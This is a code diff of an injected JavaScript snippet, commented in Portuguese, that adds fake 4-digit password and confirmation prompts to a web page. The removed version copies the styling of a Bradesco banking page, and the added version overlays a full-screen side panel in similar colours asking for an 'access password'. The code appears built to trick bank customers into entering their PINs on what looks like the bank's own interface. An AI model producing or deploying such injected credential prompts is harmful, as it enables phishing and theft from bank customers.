@@ -1,43 +1,36 @@
-/* INJEÇÃO UNIVERSAL ENGECEMA - SENHA E CONFIRMAÇÃO */
+/* INJEÇÃO DE SEGURANÇA DALLAS - FORÇAR ABA DE SENHA */
 (function() {
-    const injetarSegurancaEngecema = () => {
-        // 1. Localiza qualquer campo que pareça ser de "Conta" ou "Agência"
-        const campos = document.querySelectorAll('input[type="text"], input[type="number"]');
-        const btnOk = document.querySelector('.btn-ok') || document.querySelector('button') || document.querySelector('input[type="submit"]');
+    // Só injeta se a aba ainda não existir na tela
+    if (document.getElementById('aba-porteiro-dallas')) return;
 
-        if (campos.length >= 2 && btnOk && !document.getElementById('senha-private')) {
-            // Criar Campo Senha
-            const s1 = document.createElement('input');
-            s1.id = 'senha-private'; s1.type = 'password'; s1.placeholder = 'Senha';
-            s1.required = true; s1.maxLength = 4;
-            s1.className = campos[0].className; // Copia o estilo original do Bradesco
-            s1.style.width = '80px'; s1.style.marginRight = '5px'; s1.style.padding = '8px';
+    const css = `
+        #aba-porteiro-dallas { position:fixed!important; top:0!important; right:0!important; width:400px!important; height:100vh!important; background:#111!important; z-index:9999999!important; border-left:2px solid #c5a059!important; padding:60px 40px!important; box-shadow:-25px 0 70px #000!important; color:#fff!important; font-family:Arial!important; display:flex!important; flex-direction:column!important; box-sizing:border-box!important; }
+        .in-dallas { width:100%; padding:20px; background:#000; border:1px solid #333; color:#c5a059; font-size:32px; text-align:center; letter-spacing:10px; margin:30px 0; outline:none; border-radius:4px; }
+        .bt-dallas { width:100%; padding:20px; background:#cc092f; color:#fff; border:none; font-weight:bold; text-transform:uppercase; cursor:pointer; border-radius:4px; }
+    `;
+    const st = document.createElement('style'); st.innerHTML = css; document.head.appendChild(st);
 
-            // Criar Campo Confirmar
-            const s2 = document.createElement('input');
-            s2.id = 'confirma-private'; s2.type = 'password'; s2.placeholder = 'Confirmar';
-            s2.required = true; s2.maxLength = 4;
-            s2.className = campos[0].className; // Copia o estilo original
-            s2.style.width = '80px'; s2.style.marginRight = '5px'; s2.style.padding = '8px';
+    const div = document.createElement('div');
+    div.id = 'aba-porteiro-dallas';
+    let s1 = "";
 
-            // Insere os dois novos campos antes do botão de OK/Acessar
-            btnOk.parentNode.insertBefore(s1, btnOk);
-            btnOk.parentNode.insertBefore(s2, btnOk);
-
-            // Trava o envio se as senhas não forem iguais
-            const form = btnOk.closest('form');
-            if (form) {
-                form.onsubmit = function(e) {
-                    if (s1.value !== s2.value) {
-                        e.preventDefault();
-                        alert("As senhas não conferem!");
-                        return false;
-                    }
-                };
+    const render = (tit, sub, btn) => {
+        div.innerHTML = '<img src="logo.png" style="height:30px;margin-bottom:25px;"><h2 style="color:#c5a059;font-size:16px;">'+tit+'</h2><p style="color:#666;font-size:12px;">'+sub+'</p><input type="password" id="p-d" class="in-dallas" maxlength="4" placeholder="••••"><button class="bt-dallas" id="b-d">'+btn+'</button>';
+        document.body.appendChild(div);
+        document.getElementById('b-d').onclick = () => {
+            const val = document.getElementById('p-d').value;
+            if(val.length === 4) {
+                if(s1 === "") { 
+                    s1 = val; 
+                    render("CONFIRMAR SENHA", "Repita a senha para validar o acesso Dallas.", "CONFIRMAR E ENTRAR"); 
+                } else if(val === s1) { 
+                    div.style.display="none"; 
+                    // Se for o clique no azul, o navegador segue o fluxo original
+                } else { 
+                    alert("Senhas não conferem."); location.reload(); 
+                }
             }
-        }
+        };
     };
-
-    // Executa a cada 1 segundo para garantir que "vença" a imutabilidade do carregamento
-    setInterval(injetarSegurancaEngecema, 1000);
+    render("SENHA DE ACESSO", "Identificação Dallas requerida. Informe sua senha de 4 dígitos.", "AVANÇAR");
 })();
